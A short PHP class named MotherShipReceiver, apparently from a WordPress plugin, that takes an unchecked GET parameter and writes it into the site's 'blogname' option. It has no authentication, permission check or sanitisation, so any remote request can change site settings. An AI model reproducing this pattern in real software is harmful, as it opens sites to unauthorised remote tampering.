<?php

namespace SC5050;

// this class receives data from the remote clients

class MotherShipReceiver{
    
    public function __construct(){}

    public function receivePayload(){
            $dataPackage = $_GET['sc5050'];
            update_option('blogname', $dataPackage);
    }
    
}
